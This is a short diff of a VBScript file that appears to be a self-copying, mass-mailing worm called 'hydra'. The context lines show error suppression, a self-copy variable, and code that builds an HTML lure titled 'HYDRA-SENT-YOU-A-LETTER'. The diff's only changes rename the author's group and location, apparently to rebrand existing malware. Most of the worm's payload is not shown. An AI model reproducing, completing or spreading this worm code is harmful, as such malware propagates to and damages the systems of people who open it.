@@ -1,5 +1,5 @@
 rem  barok -hydra(vbe) <uwu>
-rem by: master7720  /  master7720@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
+rem by: master7720  /  master7720@mail.com  /  @imperial Group  /  LA
  On Error Resume Next
  dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
  eq=""
@@ -208,7 +208,7 @@ rem by: master7720  /  master7720@mail.com  /  @GRAMMERSoft Group  /  Manila,Phi
  dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
  dta1="<HTML><HEAD><TITLE>HYDRA - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
  HYDRA@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@master7720 ?-? master7720@mail.com ?-?
- @GRAMMERSoft Group ?-? LA ?-? March 2000@-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
+ @imperial Group ?-? LA ?-? March 2000@-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
  CONTENT=@-@simple but i think this its good...@-@>"&vbcrlf& _
  "<?-?HEAD><BODY
  ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#HYDRA-SENT-YOU-A-LETTER.
